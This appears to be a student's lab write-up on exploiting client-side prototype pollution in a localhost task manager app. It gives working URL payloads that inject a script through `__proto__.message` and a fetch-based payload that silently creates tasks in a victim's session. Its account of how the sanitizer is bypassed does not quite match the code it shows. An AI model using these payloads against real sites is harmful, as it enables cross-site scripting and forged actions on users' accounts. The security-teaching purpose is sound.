# Manual Prototype Pollution via URL Parameters (Task Manager Lab)

> [!info]  
> **Overview**  
> This lab walks through identifying and exploiting client-side prototype pollution in a JavaScript-based task manager application. It uses vulnerable libraries, such as `dparam`, to inject malicious data via URL parameters, leading to DOM-based cross-site scripting (XSS) and application abuse.

---

## Environment Setup and Compatibility Fix

### Setting Up the Lab in VS Code

1. Open **Visual Studio Code**.
    
2. Select **File → Open Folder**, navigate to your lab folder.
    
3. Open the integrated terminal using `Ctrl + Shift + \`` or` Ctrl + Shift + P → Terminal: Create New Terminal`.
    
4. Run the following:
    

```bash
npm install
node app.js
```

### Resolving Platform Mismatch Errors

If you see `Invalid ELF Header`:

1. Delete incompatible binaries:
    

```bash
rm -rf node_modules package-lock.json
```

2. Reinstall for your current OS:
    

```bash
npm install
node app.js
```

3. Visit the localhost URL provided in the terminal.
    

> [!warning]  
> This error usually occurs when `node_modules` was created on a different operating system.

---

## Application Functionality Overview

Before attacking, review how the application works:

- You can register and log in.
    
- You can create, edit, and delete tasks.
    
- You can filter tasks by:
    
    - Title
        
    - Status
        
    - Priority
        

The application reads URL parameters and reflects them into the dashboard.

---

## Frontend Review: Attack Surface Mapping

### Key Observations from Code

- The app uses `dparam` to parse URL parameters.
    
- It merges them with default values using `Object.assign`.
    
- Then, it renders the `message` content to the DOM via `innerHTML`.
    

```javascript
let userSettings = dparam(location.search.substring(1));
let mergedSettings = Object.assign({}, defaultSettings, userSettings);
document.getElementById("searchResultsInfo").innerHTML = sanitizeHTML(mergedSettings.message);
```

> [!important]  
> The vulnerable flow is: **untrusted input → dparam → Object.assign → innerHTML**, with only a weak sanitization function in between.

---

## Identifying the Exploitation Path

|Component|Description|
|---|---|
|Source|`dparam(location.search)` (user-controlled input)|
|Sink|`searchResultsInfo.innerHTML`|
|Gadget|`Object.assign()` used to merge objects|

These three components define the prototype pollution path.

---

## Verifying the Vulnerability

### Step 1: Confirm Message Reflection

Test basic functionality:

```
http://localhost:3000/dashboard?message=test
```

Expected: "test" is reflected in the search results info box.

### Step 2: Attempt Prototype Pollution

```
http://localhost:3000/dashboard?__proto__.polluted=true
```

In the browser console, verify:

```javascript
console.log({}.polluted); // true
```

> [!success]  
> If this logs `true`, prototype pollution is confirmed.

---

## Bypassing Sanitization to Trigger XSS

### Attempt with Direct Message

```
http://localhost:3000/dashboard?message=<script>alert(1)</script>
```

Blocked by `sanitizeHTML`.

### Bypass with Pollution

```
http://localhost:3000/dashboard?__proto__.message=<script>alert(1)</script>
```

Since `mergedSettings.message` doesn’t exist, the code accesses the polluted prototype property, bypassing the filter.

> [!danger]  
> This is a critical DOM-based XSS triggered by prototype pollution.

---

## Exploiting Application Functionality

### Step 1: Intercept Task Creation in Burp

- Create a new task.
    
- Capture the POST request to `/tasks/create`.
    

Example body:

```
title=important+task&status=pending&priority=high
```

### Step 2: Create a Payload

Write this into a file (e.g., `payload.js`):

```javascript
<script>
fetch("http://localhost:3000/tasks/create", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "title=important+task&status=pending&priority=high",
  credentials: "include"
});
</script>
```

Minify and URL-encode this payload.

### Step 3: Inject via URL

Use:

```
http://localhost:3000/dashboard?__proto__.message=[encoded_payload]
```

Upon visiting the link, the victim's browser executes the fetch request and creates a task in their session.

> [!tip]  
> Always test with your own session first to confirm payload success.

---

## Summary of Manual Workflow

1. Analyze code for `Object.assign`, URL parameter parsing, and DOM sinks.
    
2. Confirm input reflection and sanitization.
    
3. Pollute `__proto__.message` with a sanitized-bypassing payload.
    
4. Use this vector to execute XSS and application-level abuse (e.g., task creation).
    

---

## Key Takeaways and Exam Reminders

> [!important]  
> These are critical concepts that may appear in your open-book exam.

- **Prototype pollution** occurs when input like `__proto__.key=value` alters global object behavior.
    
- `Object.assign()` is a common **gadget** that facilitates merging polluted properties.
    
- `dparam` is a **known vulnerable library**.
    
- A polluted prototype property can **bypass input validation or sanitization** checks.
    
- Example payload for confirmation:
    

```
?__proto__.polluted=true
```

- XSS bypass payload:
    

```
?__proto__.message=<script>alert(1)</script>
```

- You can escalate by injecting a `fetch` POST to `/tasks/create`.
    

---

## References

- [PayloadAllTheThings – Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Injections/Prototype%20Pollution)
    
- [MDN: Object.assign()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign)
    
- [OWASP: Prototype Pollution](https://owasp.org/www-community/attacks/Prototype_Pollution)
    
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
